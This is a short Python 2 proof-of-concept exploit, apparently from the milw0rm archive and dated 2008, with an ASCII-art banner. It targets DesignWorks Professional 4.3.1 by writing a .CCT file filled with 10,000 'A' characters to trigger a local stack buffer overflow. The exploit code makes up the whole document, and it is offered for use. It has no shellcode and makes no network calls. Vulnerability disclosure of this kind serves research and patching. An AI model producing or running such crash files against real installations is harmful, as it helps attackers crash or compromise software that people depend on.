#
#                          I'm Cn4phux
#                  ------  |      ______ _____   (--, __*__  ______
#                  |____|  |  Â¤   |    | |       | ! )  |    |     |
#                [ |    |` |      | <> | |-----> |__/   |    |  Â¤  | ]
#                  | .. |  |____! |____| |____   |\     |    |-----|
#                                      |        _| \  -----  | ::: |
#                                      |         |  \
#                                |_____|         |   \
#                                                |
#                                                |
#                                               ,|.
#                                              / | \
#                                             |  |  |
#                                             |  _  |
#                                           `._\/.\/_,'
#                                             _( 8 )_
#                                            / '_ _' \
#                                           |  /{_}\  |
#                                           ` |  "  | `
#                                             |     |
#
#
# [+] Application               : DesignWorks Professional 4.3.1
#
# [+] Application's Description : (" DesignWorks Professional Schematic Capture for Windows...,Google-it.)
#
# [+] Bug                       : Local .CCT File Stack Buffer Overflow (PoC)
#
# [+] Author                    : Cn4phux
#
import sys
import os
print "[x] Local Stack Overflow PoC"
try:
   milef = open("x2.cct",'w')
  
except IOError, e:
    print "Unable to open file ", e
    sys.exit(0)
print "[x] File sucessfully opened for writing."
try:
   milef.write("A" * 10000)
except IOError, e:
   
    print "Unable to write to file ", e
    sys.exit(0)
   
print "[x] Exploit successfully written."
milef.close()
print "[x] ."
print "\n[x] Cn4phux made in DZ, Great'z to all Algerians. /Google.dz"

# milw0rm.com [2008-12-06]
